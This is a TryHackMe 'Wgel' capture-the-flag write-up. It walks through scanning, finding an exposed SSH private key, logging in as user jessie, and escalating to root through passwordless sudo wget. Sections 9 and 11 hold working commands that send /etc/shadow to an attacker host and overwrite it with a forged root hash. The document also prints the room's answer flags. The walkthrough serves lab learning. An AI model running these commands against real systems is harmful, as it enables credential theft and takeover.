# TryHackMe: Wgel CTF Writeup

Platform: TryHackMe  
Room: Wgel

---

## 1. Reconnaissance

First, we verify that the target is alive:

```bash
ping 10.128.155.166
```

The host responds, confirming connectivity.

---

## 2. Port Scanning

We perform a scan using Nmap:

```bash
nmap -sV -sC -oN scan 10.128.155.166
```

### Results:

- **22/tcp** → SSH (OpenSSH 7.2p2)
    
- **80/tcp** → HTTP (Apache 2.4.18)
    

This suggests a typical web + SSH attack surface.

---

## 3. Web Enumeration

Visiting:

```
http://10.128.155.166
```

We find the default Apache page.

### Source Code Analysis

A comment is discovered:

```html
<!-- Jessie don't forget to update the website -->
```

**"jessie"** is likely a valid username.

---

## 4. Directory Fuzzing

Using ffuf:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.128.155.166/FUZZ
```

### Findings:

- `/sitemap` (interesting)
    

---

### Further fuzzing:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.128.155.166/sitemap/FUZZ
```

### Findings:

- `/.ssh` 
    

---

## 5. SSH Key Exposure

Inside `/sitemap/.ssh`, we find:

`id_rsa` (private key)

This is a **critical misconfiguration**.

---

## 6. Initial Access

Save the key and fix permissions:

```bash
chmod 600 id_rsa
```

Connect via SSH:

```bash
ssh -i id_rsa jessie@10.128.155.166
```

Access obtained as user **jessie**

---

## 7. User Flag

```bash
cat ~/Documents/user_flag.txt
```

**User flag:**

```
057c67131c3d5e42dd5cd3075b198ff6
```

---

## 8. Privilege Escalation

https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-wget-privilege-escalation

Check sudo permissions:

```bash
sudo -l
```

### Result:

```bash
(root) NOPASSWD: /usr/bin/wget
```

We can run **wget as root without password** 

---

## 9. Exploitation: Abusing wget

We use wget to **exfiltrate `/etc/shadow`**:

```bash
sudo /usr/bin/wget --post-file=/etc/shadow http://192.168.128.91:4444
```

This sends the shadow file to our machine.

---

## 10. Create Root Password

On attacker machine:

```bash
openssl passwd -6 -salt 'salt' 'password'
```

Add the generated hash to `shadow.txt`:

```bash
root:$6$salt$...:...
```

---

## 11. Replace Shadow File

Start a server:

```bash
python3 -m http.server 8000
```

Then on target:

```bash
sudo /usr/bin/wget http://192.168.128.91:8000/shadow.txt -O /etc/shadow
```

This overwrites `/etc/shadow` with our modified version.

---

## 12. Root Access

Switch to root:

```bash
su root
```

Password:

```
password
```

---

## 13. Root Flag

```bash
cat /root/root_flag.txt
```

**Root flag:**

```
b1b968b37519ad1daa6408188649263d
```

---

# Key Takeaways

- Exposed `.ssh` directory = **critical vulnerability**
    
- Private key leakage = instant access
    
- Misconfigured sudo (`wget`) = **privilege escalation**
    
- `/etc/shadow` manipulation = full system compromise